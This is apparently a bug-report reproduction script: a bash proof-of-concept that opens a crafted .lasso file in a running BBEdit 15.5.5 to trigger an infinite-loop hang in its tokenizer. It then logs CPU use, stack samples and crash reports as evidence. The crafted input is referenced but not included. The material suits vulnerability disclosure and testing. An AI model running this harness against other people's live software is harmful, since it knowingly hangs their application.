#!/usr/bin/env bash
set -euo pipefail

BUNDLE="$(cd "$(dirname "$0")" && pwd)"
INPUT="$BUNDLE/payload.lasso"
TIMEOUT_S="${TIMEOUT_S:-20}"
CPU_THRESHOLD="${CPU_THRESHOLD:-80}"
DIAG_DIR="$HOME/Library/Logs/DiagnosticReports"
OUT_ROOT="${OUT_ROOT:-$BUNDLE/evidence}"
RUN_ID="${RUN_ID:-lasso_live_$(date +%Y%m%d_%H%M%S)}"
OUT_DIR="$OUT_ROOT/$RUN_ID"

echo "Demo: LassoTokenizer Infinite Loop (DoS hang)"
echo "Affected software: BBEdit 15.5.5 (build 430000124), live process"
echo

if [[ ! -f "$INPUT" ]]; then
  echo "[!] Missing reproducer: $INPUT"
  exit 1
fi

if ! pgrep -x "BBEdit" >/dev/null 2>&1; then
  echo "[!] BBEdit is not running. Start BBEdit first, then re-run this script."
  exit 1
fi

mkdir -p "$OUT_DIR"
pid="$(pgrep -x "BBEdit" | head -n 1)"
tmp_lasso_base="$(mktemp "/tmp/bbedit_live_lasso_hang.XXXXXX")"
tmp_lasso="${tmp_lasso_base}.lasso"
cp "$INPUT" "$tmp_lasso"
shasum -a 256 "$tmp_lasso" > "$OUT_DIR/input.sha256"
start_epoch="$(date +%s)"
{
  echo "run_id=$RUN_ID"
  echo "start_epoch=$start_epoch"
  echo "bbedit_pid_before=$pid"
  echo "input_path=$tmp_lasso"
  echo "input_source=$INPUT"
  echo "timeout_s=$TIMEOUT_S"
  echo "cpu_threshold=$CPU_THRESHOLD"
} > "$OUT_DIR/run.meta"

echo "[*] Live BBEdit PID before trigger: $pid"
echo "[*] Opening crafted .lasso file in running BBEdit: $tmp_lasso"
open -a "BBEdit" "$tmp_lasso"

echo "[*] Watching BBEdit CPU for ${TIMEOUT_S}s (hang signal: >= ${CPU_THRESHOLD}%)"
set +e
hit=0
cpu_hits=0
sample1="$OUT_DIR/sample1.txt"
sample2="$OUT_DIR/sample2.txt"
sample_points=("$((TIMEOUT_S / 3))" "$((2 * TIMEOUT_S / 3))")
for i in $(seq 1 "$TIMEOUT_S"); do
  sleep 1
  if ! ps -p "$pid" >/dev/null 2>&1; then
    break
  fi
  cpu="$(ps -p "$pid" -o %cpu= | awk '{print int($1)}')"
  echo "t=${i} cpu=${cpu}%" | tee -a "$OUT_DIR/cpu.log"
  if [[ "$cpu" -ge "$CPU_THRESHOLD" ]]; then
    hit=1
    cpu_hits=$((cpu_hits + 1))
  fi

  if [[ "$i" -eq "${sample_points[0]}" ]]; then
    sample "$pid" 2 -mayDie > "$sample1" 2>&1
  fi
  if [[ "$i" -eq "${sample_points[1]}" ]]; then
    sample "$pid" 2 -mayDie > "$sample2" 2>&1
  fi
done
set -e

alive=0
if ps -p "$pid" >/dev/null 2>&1; then
  alive=1
fi

report_candidate=""
if [[ -d "$DIAG_DIR" ]]; then
  while IFS= read -r f; do
    mtime="$(stat -f %m "$f" 2>/dev/null || echo 0)"
    if [[ "$mtime" -ge "$start_epoch" ]]; then
      report_candidate="$f"
      break
    fi
  done < <(ls -1t "$DIAG_DIR"/BBEdit*.ips "$DIAG_DIR"/BBEdit*.crash 2>/dev/null || true)
fi
if [[ -n "$report_candidate" ]]; then
  cp "$report_candidate" "$OUT_DIR/"
fi

loop_sig1=0
loop_sig2=0
if [[ -f "$sample1" ]] && grep -Eiq "LassoTokenizer::findNextToken|BBLMTextUtils::skipWhitespace" "$sample1"; then
  loop_sig1=1
fi
if [[ -f "$sample2" ]] && grep -Eiq "LassoTokenizer::findNextToken|BBLMTextUtils::skipWhitespace" "$sample2"; then
  loop_sig2=1
fi
loop_signal=0
if [[ "$loop_sig1" -eq 1 && "$loop_sig2" -eq 1 ]]; then
  loop_signal=1
fi

{
  echo "bbedit_alive_after=$alive"
  echo "cpu_hits=$cpu_hits"
  echo "loop_sig_sample1=$loop_sig1"
  echo "loop_sig_sample2=$loop_sig2"
  echo "loop_signal_consistent=$loop_signal"
  echo "report_candidate=${report_candidate:-none}"
} >> "$OUT_DIR/run.meta"

echo
if [[ "$alive" -eq 1 && "$hit" -eq 1 && "$loop_signal" -eq 1 ]]; then
  echo "[+] Reproduced with strong evidence:"
  echo "    - BBEdit stayed alive"
  echo "    - sustained high CPU (${cpu_hits} hits)"
  echo "    - repeated stack samples show tokenizer loop signatures"
  echo "    Evidence: $OUT_DIR"
  exit 0
fi

if [[ "$alive" -eq 0 ]]; then
  echo "[!] BBEdit exited while running hang PoC."
  echo "    This may indicate a crash path; inspect evidence in: $OUT_DIR"
  exit 1
fi

echo "[!] No clear strong hang signal observed in ${TIMEOUT_S}s."
echo "    Evidence: $OUT_DIR"
exit 1
